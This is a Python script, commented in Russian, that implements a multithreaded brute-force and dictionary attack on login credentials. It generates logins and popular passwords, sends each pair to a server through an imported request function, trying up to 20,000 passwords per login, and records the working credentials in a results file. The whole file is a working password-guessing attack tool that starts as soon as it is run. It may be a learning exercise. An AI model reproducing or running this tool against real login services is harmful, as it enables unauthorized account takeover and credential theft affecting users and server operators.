import threading
from generators import simple_login_generator
from generators import simple_password_generator
from generators import popular_password_generator
from generators import brute_force_generator
from requesters import myserver


class Hack:

    # Функция принимает классы (не объекты)
    def __init__(self, login_generator, password_generator, request,
                 limit_passwords_per_login=100, result_filename='result.txt'):
        """
        Создание класса Хакер
        :param login_generator:  функция генерации логинов
        :param password_generator: функция генерации паролей
        :param request: функция запроса на сервер
        :param limit_passwords_per_login: кол-во запросов на логин
        :param result_filename: запись результатов
        """
        self.login_generator = login_generator
        self.password_generator = password_generator
        self.request = request
        self.limit_passwords_per_login = limit_passwords_per_login
        self.result_filename = result_filename

    def attack(self):
        """Функция генерации логина и создания потоков"""

        # Генерация логина
        login_generator = self.login_generator()
        login = login_generator.next()
        threads = []

        # Реализация параллельного перебора логинов и паролей
        while login is not None:
            # self.attack_login(login)
            # Создание потока
            thread = threading.Thread(target=self.attack_login, args=[login])
            thread.start()
            threads.append(thread)
            login = login_generator.next()

        for thread in threads:
            thread.join()

    def attack_login(self, login):
        """Функция аттаки на определенный логин"""

        # Генератор паролей
        password_generator = self.password_generator()

        # Ограничение на число паролей
        for i in range(self.limit_passwords_per_login):
            password = password_generator.next()

            # Пока пароли не закончились
            if password is None:
                break
            print('Trying break login: \'' + login + '\' password =\'' + password + '\'')

            # Отправка логина, пароля на сервер, который выбирается пользователем
            success = self.request(login, password)

            # Если взлом успешен, то записываем результат в файл
            if success:
                print("SUCCESS! For the LOGIN \'" + login + "\' valid PASSWORD: \'" + password + "\'")
                with open(self.result_filename, 'a') as result_file:
                    result_file.write('LOGIN: ' + login + ' PASSWORD: ' + password + '\n')
                    break


# Создание экземпляра класса с пользовательскими аргументами
hack = Hack(login_generator=simple_login_generator.Generator,
            password_generator=popular_password_generator.Generator,
            request=myserver.request,
            limit_passwords_per_login=20000)

# При запуске программа первой выполняется функция attack()
hack.attack()
